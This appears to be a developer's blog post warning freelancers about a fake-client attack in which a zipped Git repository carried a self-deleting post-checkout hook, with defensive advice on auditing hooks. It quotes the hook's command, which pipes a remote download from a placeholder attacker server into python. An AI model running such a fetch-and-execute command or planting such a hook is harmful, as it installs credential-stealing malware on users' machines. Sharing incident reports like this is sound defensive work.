---
title: "Warning to Freelancers and Developers: I Was Infected by a Fake Client Through a Git Repository"
date: 2026-06-08
tags: ["security", "git", "freelancing", "malware", "tips"]
categories: ["posts"]
description: "A real malware attack targeting freelancers via a malicious Git post-checkout hook hidden inside a ZIP repository sent by a fake client."
---

I recently fell victim to a malware attack from someone posing as a client on a freelancing platform. I'm sharing exactly what happened so other developers can recognize and avoid the same trap.

## How the Attack Worked

1. The "client" sent me a ZIP file containing a Git repository.
2. They asked me to check out a branch called `plan` to review the project requirements.
3. I downloaded the ZIP and ran:

```bash
git checkout plan
```

That was enough to infect my machine.

## What Was Inside

After investigating the incident, I discovered that the repository contained a malicious Git `post-checkout` hook. When the branch was checked out, the hook automatically executed:

```bash
curl -s https://<attacker-server>/dtech/tunetrek | python3
```

The hook also deleted itself after execution to make the compromise harder to notice.

## The Full Attack Chain

```
Fake client
  ↓
ZIP repository
  ↓
"Please checkout branch plan"
  ↓
Git post-checkout hook
  ↓
Download remote payload via curl
  ↓
Execute payload with Python
  ↓
Steal credentials, browser sessions, crypto wallets, and other sensitive data
```

## What Git Hooks Are (and Why This Is Dangerous)

Git hooks are scripts that Git automatically runs before or after certain events — commits, merges, checkouts, and more. They live in the `.git/hooks/` directory of any repository. Because `.git/` is not tracked by version control itself, these scripts are invisible when browsing a project on GitHub or GitLab. They only come into play once you have the repository on your local machine.

The `post-checkout` hook is triggered every time you run `git checkout`. Whoever crafted this attack knew that asking a freelancer to "check out a branch to review requirements" is completely routine — it's something developers do without a second thought.

## Lessons Learned

- **Never trust ZIP repositories sent by unknown clients.** A public GitHub link is far safer — at minimum, the repository history and files are visible before you clone.
- **Always inspect `.git/hooks/` before running Git operations** on any repository you didn't clone from a trusted source.
- **Be cautious when a client immediately asks you to check out a specific branch** right after handing you a ZIP file. This is a red flag.
- **Review unknown repositories inside a VM or isolated environment.** Tools like Docker, VirtualBox, or a dedicated throwaway machine can contain the blast radius of an attack like this.
- **Check for executable hook files.** On Linux/macOS, run `ls -la .git/hooks/` and look for anything that isn't a `.sample` file. If you see `post-checkout`, `pre-commit`, or similar without the `.sample` extension, read the contents carefully before proceeding.

## How to Audit Hooks Quickly

Before running any Git command on an untrusted repo, inspect the hooks directory:

```bash
ls -la .git/hooks/
cat .git/hooks/post-checkout   # if it exists
```

Any hook without the `.sample` suffix is active and will execute automatically. Treat any unexpected executable in that folder as suspicious.

## Final Thoughts

This attack required almost no technical sophistication from the attacker's side — it exploited trust and routine developer workflow. Freelancers are a particularly attractive target because we regularly receive code from strangers and are accustomed to quickly spinning up unfamiliar projects.

Stay skeptical, slow down when something feels off, and always inspect before you execute.

If you've seen similar attacks recently, feel free to reach out — I'd be interested to hear about variations of this technique.

---
**See also:**
- [Best Proxies for Web Scraping](/posts/best-proxies-for-web-scraping/) — proxy setup for scraping projects
- [Python Using Playwright with Proxy](/posts/python-using-playwright-with-proxy/) — code example using a proxy in Playwright
